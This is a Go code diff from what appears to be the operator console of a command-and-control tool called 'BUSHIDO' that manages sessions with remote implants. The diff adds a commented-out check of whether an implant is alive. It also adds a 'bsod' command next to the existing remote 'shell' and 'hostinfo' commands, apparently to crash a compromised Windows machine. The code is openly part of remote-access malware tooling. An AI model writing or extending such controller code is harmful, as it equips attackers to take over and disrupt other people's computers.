@@ -64,6 +64,31 @@ func (ll *SessionList) closeSessions() {
 	ll.Head = nil // Reset the listener list
 }
 
+// func isAliveQuick(conn *net.Conn) bool {
+// 	buff := make([]byte, 9000)
+// 	(*conn).Write([]byte("AreYouAlive"))
+// 	read_len, err := (*conn).Read([]byte(buff))
+// 	for i := 0; i < 3; i++ {
+// 		if read_len <= 1 {
+// 			fmt.Println("Something Went Wrong")
+// 			return false
+// 		}
+// 		if err != nil {
+// 			fmt.Println("Something Went Wrong")
+// 			return false
+// 		}
+// 		strBuff := string(buff)
+// 		fmt.Println(strBuff)
+// 		if strBuff == "IAMALIVE" {
+// 			fmt.Println("Agent is Alive")
+// 			return true
+// 		}
+// 		time.Sleep(5 * time.Second)
+// 	}
+// 	fmt.Println("Implant could not be reached")
+// 	return false
+// }
+
 func openSession(id int, sl *SessionList) {
 	//sl.displaySessions()
 	current := sl.Head
@@ -81,7 +106,10 @@ func openSession(id int, sl *SessionList) {
 	fmt.Println("\nSession Found !")
 	fmt.Println("Connecting ...")
 	//Impliment some sort of auth. Hash some string. If agent responds with the same hash super. If agent is late kill. If agent responds false kill.
-	//current.Conn.Write(([]byte("Success talking to" + string(current.id)))) Quick Test To see if implant gets it via netcat
+	// if !isAliveQuick(&current.Conn) {
+	// 	fmt.Println("Could Not Open the Session")
+	// 	return
+	// }
 	fmt.Println("BUSHIDO Shell Open ...\n")
 	reader := bufio.NewReader(os.Stdin)
 
@@ -98,6 +126,8 @@ func openSession(id int, sl *SessionList) {
 			shell(&current.Conn)
 		case "hostinfo":
 			hostinfo(&current.Conn)
+		case "bsod":
+			bsod(&current.Conn)
 		case "bg":
 			return
 		case "exit":
